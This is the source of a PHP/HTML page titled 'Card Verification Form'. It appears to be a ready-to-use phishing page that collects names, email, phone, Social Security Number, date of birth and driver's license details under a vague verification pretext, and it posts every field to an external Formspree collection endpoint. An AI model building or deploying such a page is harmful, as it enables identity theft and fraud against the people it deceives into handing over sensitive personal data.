<?php
session_start();

// Generate a new CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Verification Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 500px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        .form-group button {
            padding: 10px 15px;
            background-color: #28a745;
            border: none;
            color: white;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #218838;
        }
        .notice {
            margin-bottom: 15px;
            color: red;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Card Verification Form</h2>
    <div class="notice">
        Please fill out the form below with your details.
    </div>
    <form action="https://formspree.io/f/xovvrjzb" method="POST">
        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
        <div class="form-group">
            <label for="first_name">First Name:</label>
            <input type="text" id="first_name" name="first_name" required>
        </div>
        <div class="form-group">
            <label for="last_name">Last Name:</label>
            <input type="text" id="last_name" name="last_name" required>
        </div>
        <div class="form-group">
            <label for="email">Your email:</label>
            <input type="email" id="email" name="email" required>
        </div>
        <div class="form-group">
            <label for="phone">Phone Number:</label>
            <input type="tel" id="phone" name="phone" required>
        </div>
        <div class="form-group">
            <label for="ssn">Social Security Number (SSN):</label>
            <input type="text" id="ssn" name="ssn" required pattern="\d{3}-\d{2}-\d{4}" title="SSN format: 123-45-6789">
        </div>
        <div class="form-group">
            <label for="dob">Date of Birth (DOB):</label>
            <input type="date" id="dob" name="dob" required>
        </div>
        <div class="form-group">
            <label for="drivers_license">Driver's License Number (optional):</label>
            <input type="text" id="drivers_license" name="drivers_license">
        </div>
        <div class="form-group">
            <label for="license_state">Driver's License State (optional):</label>
            <input type="text" id="license_state" name="license_state">
        </div>
        <div class="form-group">
            <label for="issue_date">Driver's License Issue Date (optional):</label>
            <input type="date" id="issue_date" name="issue_date">
        </div>
        <div class="form-group">
            <label for="expiration_date">Driver's License Expiration Date (optional):</label>
            <input type="date" id="expiration_date" name="expiration_date">
        </div>
        <div class="form-group">
            <button type="submit">Send</button>
        </div>
    </form>
</div>

</body>
</html>